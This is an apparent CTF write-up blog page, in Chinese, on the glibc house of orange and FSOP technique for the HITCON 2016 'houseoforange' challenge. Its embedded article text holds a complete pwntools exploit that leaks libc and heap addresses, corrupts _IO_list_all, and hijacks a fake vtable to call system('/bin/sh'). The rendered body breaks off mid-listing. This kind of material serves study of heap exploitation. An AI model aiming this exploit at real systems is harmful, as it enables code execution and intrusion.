<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>How2heap--house_of_orange Hitcon2016--houseoforange | hhdx's blog</title>
<meta name=keywords content="CTF,how2heap"><meta name=description content="house of orange
修改topchunk->size为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。
当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将topchunk->size减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行_int_free (av, old_top, 1)将其放入unsorted bin。
代码涉及_int_malloc后边和sysmalloc。"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/how2heap-house-of-orange-hitcon2016-houseoforange/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/how2heap-house-of-orange-hitcon2016-houseoforange/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/how2heap-house-of-orange-hitcon2016-houseoforange/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="How2heap--house_of_orange Hitcon2016--houseoforange"><meta property="og:description" content="house of orange 修改topchunk->size为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。
当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将topchunk->size减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行_int_free (av, old_top, 1)将其放入unsorted bin。
代码涉及_int_malloc后边和sysmalloc。"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-07-25T18:14:07+00:00"><meta property="article:modified_time" content="2020-07-25T18:14:07+00:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="How2heap"><meta name=twitter:card content="summary"><meta name=twitter:title content="How2heap--house_of_orange Hitcon2016--houseoforange"><meta name=twitter:description content="house of orange
修改topchunk->size为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。
当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将topchunk->size减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行_int_free (av, old_top, 1)将其放入unsorted bin。
代码涉及_int_malloc后边和sysmalloc。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"How2heap--house_of_orange Hitcon2016--houseoforange","item":"https://hhdx.xyz/post/how2heap-house-of-orange-hitcon2016-houseoforange/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"How2heap--house_of_orange Hitcon2016--houseoforange","name":"How2heap--house_of_orange Hitcon2016--houseoforange","description":"house of orange 修改topchunk-\u0026gt;size为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。\n当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将topchunk-\u0026gt;size减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行_int_free (av, old_top, 1)将其放入unsorted bin。\n代码涉及_int_malloc后边和sysmalloc。\n","keywords":["CTF","how2heap"],"articleBody":"house of orange 修改topchunk-\u003esize为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。\n当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将topchunk-\u003esize减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行_int_free (av, old_top, 1)将其放入unsorted bin。\n代码涉及_int_malloc后边和sysmalloc。\nFSOP `struct _IO_FILE_plus`结构 ```c struct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; ``` `struct _IO_FILE_plus`包含`struct _IO_FILE`和`struct _IO_jump_t *`，前者保存打开文件的信息，后者保存对文件进行操作的函数指针列表的指针，可以对不同类型的文件加以不同的具体操作。 struct _IO_FILE结构 ```c struct _IO_FILE { int _flags;\t/* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr;\t/* Current read pointer */ char* _IO_read_end;\t/* End of get area. */ char* _IO_read_base;\t/* Start of putback+get area. */ char* _IO_write_base;\t/* Start of put area. */ char* _IO_write_ptr;\t/* Current put pointer. */ char* _IO_write_end;\t/* End of put area. */ char* _IO_buf_base;\t/* Start of reserve area. */ char* _IO_buf_end;\t/* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; #if 0 int _blksize; #else int _flags2; #endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; struct _IO_FILE_complete { struct _IO_FILE _file; #endif #if defined _G_IO_IO_FILE_VERSION \u0026\u0026 _G_IO_IO_FILE_VERSION == 0x20001 _IO_off64_t _offset; # if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf; # else void *__pad1; void *__pad2; void *__pad3; void *__pad4; # endif size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)]; #endif }; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 struct _IO_jump_t结构 ```c struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); #if 0 get_column; set_column; #endif }; FSOP是File Stream Oriented Programming的缩写，核心就是改写_IO_list_all的值，伪造struct _IO_FILE_plus结构，对控制流进行劫持。_IO_list_all是glibc中的一个全局变量，是一个struct _IO_FILE_plus的指针，默认情况下指向stderr-\u003e-\u003estdout-\u003estdin。标准输入、标准输出、标准错误输出都是struct _IO_FILE类型，都被包含在于struct _IO_FILE_plus结构中，使用struct _IO_FILE中的chain变量连接。\n1 2 3 4 5 6 7 extern struct _IO_FILE_plus _IO_2_1_stdin_; extern struct _IO_FILE_plus _IO_2_1_stdout_; extern struct _IO_FILE_plus _IO_2_1_stderr_; #define _IO_stdin ((_IO_FILE*)(\u0026_IO_2_1_stdin_)) #define _IO_stdout ((_IO_FILE*)(\u0026_IO_2_1_stdout_)) #define _IO_stderr ((_IO_FILE*)(\u0026_IO_2_1_stderr_)) 在堆中可以使用malloc_printerr触发劫持。下图为对malloc_printerr中一系列的函数调用关系，最终在_IO_flush_all_lockp中会对链表中每一个文件进行刷新，满足条件的情况下，调用每个文件的_IO_OVERFLOW函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int _IO_flush_all_lockp (int do_lock) { ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { ... if (((fp-\u003e_mode \u003c= 0 \u0026\u0026 fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_write_base)) \u0026\u0026 _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } ... } } Hitcon2016 houseoforange 1 2 3 4 5 6 Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 分析 关键数据结构\n功能\n1 2 3 4 1. Build the house 2. See the house 3. Upgrade the house 4. Give up Build：输入名称长度size，依次经过malloc(0x10)、malloc(size)、calloc(0x8)，然后读入名称等。\nSee：输出名称等。\nUpgrade：对名称进行修改，可以输入任意长度字符，也就是堆上任意长度的溢出。\n总体思路 使用house of orange使得old top chunk进入unsorted bin。分配large size的块，泄露libc base和heap addr。\n使用unsorted bin attack修改_IO_list_all，攻击后它将指向unsorted bin在main_arena中的头结点。unsorted bin attack的同时，在同一个chunk上伪造 struct _IO_FILE_plus结构。修改该chunk-\u003esize为0x61使其落入small bin(0x60)也就是unsorted bin头结点地址+0x68（相当于修改struct _IO_FILE中chain）。\nhouse of orange 1 2 3 build(0x200 - 0x20 - 0x20 - 0x10, \"A\") # 在top chunk总共分配0x200 upgrade(0x1b0+0x20+0x10, b\"A\"*0x1d8 + p64(0xe01)) # 覆盖topchunk-\u003esize为0xe01 build(0x1000, \"A\") # 分配一个大于0xe00的块，触发house of orange leak libc and heap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # leak libc base build(0x400, \"A\"*8) io.recvuntil(\"Your choice : \") io.sendline(\"2\") io.recvuntil(\"Name of house : \") libc_addr = u64(io.recvline()[8:-1].ljust(8, b\"\\x00\")) pf(\"libc base\", libc_addr) libc_base = libc_addr - 0x3C5178 libc_base = libc_addr - 0x39C178 pf(\"libc base\", libc_base) # leak heap addr upgrade(0x10, \"A\"*0x10) io.recvuntil(\"Your choice : \") io.sendline(\"2\") io.recvuntil(\"Name of house : \") heap_addr = u64(io.recvline()[16:-1].ljust(8, b\"\\x00\")) pf(\"heap addr\", heap_addr) 分配large size的块，泄露libc base和heap addr，因为large bin会将fd_nextsize和bk_nextsize存储在chunk中（unsorted bin中的唯一chunk被取出放在large bin中，然后切割分配。如果是small size，则会在unsorted bin 中直接切割分配）。\n1 2 3 4 5 6 7 8 9 10 11 12 /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range (nb) \u0026\u0026 bck == unsorted_chunks (av) \u0026\u0026 victim == av-\u003elast_remainder \u0026\u0026 (unsigned long) (size) \u003e (unsigned long) (nb + MINSIZE)) unsorted bin attack \u0026\u0026 FSOP 1 2 3 4 5 6 7 8 9 10 11 payload = b\"A\"*0x420 payload += b\"/bin/sh\\x00\" + p64(0x61) # start offset: 0x0--fake size payload += b\"A\"*0x8 + p64(libc_base+libc.sym[\"_IO_list_all\"]-0x10) # start offset: 0x10--unsorted bin attack payload += p64(2) + p64(3) + b\"A\"*0x90 # start offset: 0x20--满足fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_write_base payload += p64(0) + b\"A\"*0x10 # start offset: 0xc0--满足fp-\u003e_mode \u003c= 0 payload += p64(heap_addr+0x430+0xe0) # start offset: 0xd8--vtable payload += p64(libc_base+libc.sym[\"system\"])*4 # start offset: 0xe0--_IO_OVERFLOW=system upgrade(len(payload), payload) io.recvuntil(\"Your choice : \") io.sendline(\"1\") error 概率性的出错，有时候_IO_list_all指向的第一个struct _IO_FILE_plus会满足_IO_OVERFLOW的执行条件，而我们伪造的在第二个，从而执行出错。\n1 2 3 4 5 6 if (((fp-\u003e_mode \u003c= 0 \u0026\u0026 fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_write_base) || (_IO_vtable_offset (fp) == 0 \u0026\u0026 fp-\u003e_mode \u003e 0 \u0026\u0026 (fp-\u003e_wide_data-\u003e_IO_write_ptr \u003e fp-\u003e_wide_data-\u003e_IO_write_base)) ) \u0026\u0026 _IO_OVERFLOW (fp, EOF) == EOF) 在我调试过程中发现_IO_vtable_offset(fp) == 0这个验证不存在，下图中的条件编译应该是选择了后者。\nfp-\u003e_mode \u003e 0中的_mode是int类型，依赖于libc地址随机。如果恰巧最高位为0，这个条件也就被满足了。\nfp-\u003e_wide_data-\u003e_IO_write_ptr \u003e fp-\u003e_wide_data-\u003e_IO_write_base正好指向bin，因为bin是空的都指向自身，而_IO_write_base位于_IO_write_ptr的低地址处，所以这个条件一定被满足。\n综上，只要随机到_mode所处位置的最高位为0，就会失败。\nexploit exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 #!/usr/bin/env python3 from pwn import * context(os=\"linux\", arch=\"amd64\", log_level=\"info\") localfile = \"houseoforange\" locallibc = \"/lib/x86_64-linux-gnu/libc.so.6\" # GLIBC 2.23-0ubuntu11.2 # locallibc = \"../glibc_versions/2.23/x64_notcache/lib/libc-2.23.so\" pf = lambda name,num :log.info(name + \": 0x%x\" % num) def build(length, name): io.recvuntil(\"Your choice : \") io.sendline(\"1\") io.recvuntil(\"Length of name :\") io.sendline(str(length)) io.recvuntil(\"Name :\") io.send(name) io.recvuntil(\"Price of Orange:\") io.sendline(\"1\") io.recvuntil(\"Color of Orange:\") io.sendline(\"1\") def upgrade(length, name): io.recvuntil(\"Your choice : \") io.sendline(\"3\") io.recvuntil(\"Length of name :\") io.sendline(str(length)) io.recvuntil(\"Name:\") io.send(name) io.recvuntil(\"Price of Orange: \") io.sendline(\"1\") io.recvuntil(\"Color of Orange: \") io.sendline(\"1\") def exp(): build(0x200 - 0x20 - 0x20 - 0x10, \"A\") upgrade(0x1b0+0x20+0x10, b\"A\"*0x1d8 + p64(0xe01)) build(0x1000, \"A\") # gdb.attach(io, \"b genops.c:759\") # gdb.attach(io, \"b *$rebase(0x13D5)\") # leak libc base build(0x400, \"A\"*8) io.recvuntil(\"Your choice : \") io.sendline(\"2\") io.recvuntil(\"Name of house : \") libc_addr = u64(io.recvline()[8:-1].ljust(8, b\"\\x00\")) pf(\"libc base\", libc_addr) libc_base = libc_addr - 0x3C5178 # libc_base = libc_addr - 0x39C178 pf(\"libc base\", libc_base) # leak heap addr upgrade(0x10, \"A\"*0x10) io.recvuntil(\"Your choice : \") io.sendline(\"2\") io.recvuntil(\"Name of house : \") heap_addr = u64(io.recvline()[16:-1].ljust(8, b\"\\x00\")) pf(\"heap addr\", heap_addr) # IO_FILE payload = b\"A\"*0x420 payload += b\"/bin/sh\\x00\" + p64(0x61) # start offset: 0x0 payload += b\"A\"*0x8 + p64(libc_base+libc.sym[\"_IO_list_all\"]-0x10) # start offset: 0x10 payload += p64(2) + p64(3) + b\"A\"*0x90 # start offset: 0x20 payload += p64(0) + b\"A\"*0x10 # start offset: 0xc0 payload += p64(heap_addr+0x430+0xe0) # start offset: 0xd8 payload += b\"A\"*0x18 + p64(libc_base+libc.sym[\"system\"]) # start offset: 0xe0 upgrade(len(payload), payload) io.recvuntil(\"Your choice : \") io.sendline(\"1\") io.interactive() argc = len(sys.argv) if argc == 1: io = process(localfile) else: if argc == 2: host, port = sys.argv[1].split(\":\") elif argc == 3: host = sys.argv[1] port = sys.argv[2] io = remote(host, port) elf = ELF(localfile) libc = ELF(locallibc) exp() reference how2heap house_of_orange.c https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/ ","wordCount":"3063","inLanguage":"zh-cn","datePublished":"2020-07-25T18:14:07Z","dateModified":"2020-07-25T18:14:07Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/how2heap-house-of-orange-hitcon2016-houseoforange/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=主页><span>主页</span></a></li><li><a href=https://hhdx.xyz/post/ title=归档><span>归档</span></a></li><li><a href=https://hhdx.xyz/tags/ title=标签><span>标签</span></a></li><li><a href=https://hhdx.xyz/underway/ title=施工中><span>施工中</span></a></li><li><a href=https://hhdx.xyz/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">How2heap--house_of_orange Hitcon2016--houseoforange</h1><div class=post-meta><span title='2020-07-25 18:14:07 +0000 UTC'>July 25, 2020</span>&nbsp;·&nbsp;hhdx</div></header><div class=post-content><h2 id=house-of-orange>house of orange<a hidden class=anchor aria-hidden=true href=#house-of-orange>#</a></h2><p>修改<code>topchunk->size</code>为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。</p><p>当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将<code>topchunk->size</code>减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行<code>_int_free (av, old_top, 1)</code>将其放入unsorted bin。</p><p>代码涉及<code>_int_malloc</code>后边和<code>sysmalloc</code>。</p><h2 id=fsop>FSOP<a hidden class=anchor aria-hidden=true href=#fsop>#</a></h2><details><summary>`struct _IO_FILE_plus`结构</summary>```c
struct _IO_FILE_plus
{
_IO_FILE file;
const struct _IO_jump_t *vtable;
};
```</details>`struct _IO_FILE_plus`包含`struct _IO_FILE`和`struct _IO_jump_t *`，前者保存打开文件的信息，后者保存对文件进行操作的函数指针列表的指针，可以对不同类型的文件加以不同的具体操作。<br><details><summary>struct _IO_FILE结构</summary>```c
struct _IO_FILE {
int _flags; /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags<pre><code>  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;
# endif
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};
</code></pre><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;/details&gt;
</span></span><span class=line><span class=cl>&lt;br /&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;details&gt;
</span></span><span class=line><span class=cl>    &lt;summary&gt; struct _IO_jump_t结构 &lt;/summary&gt;
</span></span><span class=line><span class=cl>```c
</span></span><span class=line><span class=cl>struct _IO_jump_t
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    JUMP_FIELD(size_t, __dummy);
</span></span><span class=line><span class=cl>    JUMP_FIELD(size_t, __dummy2);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_finish_t, __finish);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_overflow_t, __overflow);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_underflow_t, __underflow);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_underflow_t, __uflow);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
</span></span><span class=line><span class=cl>    /* showmany */
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_xsputn_t, __xsputn);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_seekoff_t, __seekoff);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_seekpos_t, __seekpos);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_setbuf_t, __setbuf);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_sync_t, __sync);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_doallocate_t, __doallocate);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_read_t, __read);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_write_t, __write);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_seek_t, __seek);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_close_t, __close);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_stat_t, __stat);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
</span></span><span class=line><span class=cl>    JUMP_FIELD(_IO_imbue_t, __imbue);
</span></span><span class=line><span class=cl>#if 0
</span></span><span class=line><span class=cl>    get_column;
</span></span><span class=line><span class=cl>    set_column;
</span></span><span class=line><span class=cl>#endif
</span></span><span class=line><span class=cl>};
</span></span></code></pre></td></tr></table></div></div></details><p>FSOP是File Stream Oriented Programming的缩写，核心就是改写<code>_IO_list_all</code>的值，伪造<code>struct _IO_FILE_plus</code>结构，对控制流进行劫持。<code>_IO_list_all</code>是glibc中的一个全局变量，是一个<code>struct _IO_FILE_plus</code>的指针，默认情况下指向stderr->->stdout->stdin。标准输入、标准输出、标准错误输出都是<code>struct _IO_FILE</code>类型，都被包含在于<code>struct _IO_FILE_plus</code>结构中，使用<code>struct _IO_FILE</code>中的chain变量连接。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>extern</span> <span class=k>struct</span> <span class=n>_IO_FILE_plus</span> <span class=n>_IO_2_1_stdin_</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>extern</span> <span class=k>struct</span> <span class=n>_IO_FILE_plus</span> <span class=n>_IO_2_1_stdout_</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>extern</span> <span class=k>struct</span> <span class=n>_IO_FILE_plus</span> <span class=n>_IO_2_1_stderr_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define _IO_stdin ((_IO_FILE*)(&amp;_IO_2_1_stdin_))
</span></span></span><span class=line><span class=cl><span class=cp>#define _IO_stdout ((_IO_FILE*)(&amp;_IO_2_1_stdout_))
</span></span></span><span class=line><span class=cl><span class=cp>#define _IO_stderr ((_IO_FILE*)(&amp;_IO_2_1_stderr_))
</span></span></span></code></pre></td></tr></table></div></div><p>在堆中可以使用<code>malloc_printerr</code>触发劫持。下图为对<code>malloc_printerr</code>中一系列的函数调用关系，最终在<code>_IO_flush_all_lockp</code>中会对链表中每一个文件进行刷新，满足条件的情况下，调用每个文件的<code>_IO_OVERFLOW</code>函数。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
